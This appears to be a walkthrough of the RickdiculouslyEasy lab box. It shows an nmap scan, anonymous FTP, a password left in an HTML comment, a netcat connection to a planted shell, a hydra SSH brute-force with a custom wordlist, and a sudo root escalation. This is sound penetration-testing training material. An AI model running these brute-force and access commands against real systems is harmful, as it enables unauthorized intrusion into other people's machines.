# RickdiculouslyEasy

	NOTE: The box contains 130 points.

    export IP=192.168.1.66 (Do netdiscover to find the ip of the box.)

# Nmap Result (All port scan)

```
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  tcpwrapped
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http       Cockpit web service 161 or earlier
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.1.66:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  unknown
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.91%I=7%D=7/9%Time=60E85E70%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.91%I=7%D=7/9%Time=60E85E76%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
SF:erse\x20shell\.\.\.\n#\x20");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


# Flag 1 (ftp)

There's anonymous login allowed in FTP.
```bash
┌──(kali㉿kali)-[~]
└─$ ftp $IP
Connected to 192.168.1.66.
220 (vsFTPd 3.0.3)
Name (192.168.1.66:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.00 secs (35.0561 kB/s)
```

There's was nothing special in the pub directory. \
So, Let's cat out the flag we got here that we just downloaded from the ftp server.
```bash
┌──(kali㉿kali)-[~]
└─$ cat FLAG.txt                                                   
FLAG{Whoa this is unexpected} - 10 Points

```


# Flag 2 (HTTP server) Port 80

## Directory Enumeration using gobuster
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://$IP -w /opt/directory-list-2.3-medium.txt -q -x txt,php,bin,bak                                         1 ⨯
/robots.txt           (Status: 200) [Size: 126]
/passwords            (Status: 301) [Size: 238] [--> http://192.168.1.66/passwords/]
```

So it seems like, we get another flag in passwords directory.
```
Index of /passwords
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[TXT]	FLAG.txt 	2017-08-22 02:31 	44 	 
[TXT]	passwords.html 	2017-08-23 19:51 	352 	 
```

### FLAG.txt

```
FLAG{Yeah d- just don't do it.} - 10 Points
```

### passwords.html

```
Wow Morty real clever. Storing passwords in a file called passwords.html? 
You've really done it this time Morty. Let me at least hide them.. 
I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need. 
```

Checking the page source of passwords.html \
We see the password is commented there. Nice Xd

Source code

```
<html><head>
<title>Morty's Website</title>
</head><body>Wow Morty real clever. Storing passwords in a file called passwords.html? 
You've really done it this time Morty. Let me at least hide them.. 
I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.


</body><!--Password: winter--></html>
```


# Flag 3 (port 9090)

Check the http server in your browser. \
Easy flag? Lol..
```
FLAG {There is no Zeus, in your face!} - 10 Points
```


# Flag 4 (port 13337) from Nmap result

```bash
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
```


# Flag 5 (port 60000)

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.1.66 60000                                                                                                        255 ⨯
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points 
```


# Flag 6 (port 22222)

I tried winter as password for Summer and voila... it worked

```bash
┌──(kali㉿kali)-[~]
└─$ ssh Summer@192.168.1.66 -p 22222                                                                                               1 ⨯
Summer@192.168.1.66's password: 
Last login: Sat Jul 10 00:41:43 2021 from 192.168.1.70
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ cat FLAG.txt 
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

[Summer@localhost ~]$ head -n 50 FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```

Notice that they filtered the cat command to literally show a dumb cat? haha ...


# Flag 7 

So, i downloaded all the file from Morty's directory to my host machine. \
I then used strings jpg_file and found out the password for the zip file.

> Password = Meeseek
Unzip the file and we get the flag.

```bash
┌──(kali㉿kali)-[~]
└─$ head journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. 
He spluttered something about a safe, and a password. Or maybe it was a safe password... 
Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points
```



# Flag 8

```bash
[Summer@localhost RICKS_SAFE]$ cp safe /tmp
[Summer@localhost RICKS_SAFE]$ cd /tmp
[Summer@localhost tmp]$ ./safe 
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!

[Summer@localhost tmp]$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.
```

Rick's old band = 'The Flesh Curtains' \
So, i wrote a python script for generating the wordlist with 1 uppercase character, 1 digit and one of the words from the old band. \

Here's the link for [Python Script](https://github.com/ninchy0/vulnhub-writeups/blob/main/RickdiculouslyEasy1/wordlist.py)
	


# Flag 9 

### Bruteforcing using hydra on ssh port 22222

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l RickSanchez -P wordlist.txt ssh://192.168.1.66:22222 -t60 -V
.
.
.
.
.
.
.
[22222][ssh] host: 192.168.1.66   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 56 final worker threads did not complete until end.
[ERROR] 56 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

```bash
┌──(kali㉿kali)-[~]
└─$ ssh RickSanchez@192.168.1.66 -p 22222                                                                                        255 ⨯
RickSanchez@192.168.1.66's password: P7Curtains


[RickSanchez@localhost ~]$ id
uid=1000(RickSanchez) gid=1000(RickSanchez) groups=1000(RickSanchez),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[RickSanchez@localhost ~]$ sudo -l
[sudo] password for RickSanchez: 
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL

[RickSanchez@localhost ~]$ sudo /bin/bash -p
[sudo] password for RickSanchez: 
[root@localhost RickSanchez]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt

[root@localhost ~]# head FLAG.txt
FLAG: {Ionic Defibrillator} - 30 points
```


Plot twist: Not gonna lie, I went through other people's walkthrough for some part without any guilt. I got stucked in the rick's SAFE thing. \ 
I did made a mistake right at the beginning too by not scanning all the ports :V \
Keep learning without losing motivation everyone. \ 
Take breaks if you need to.


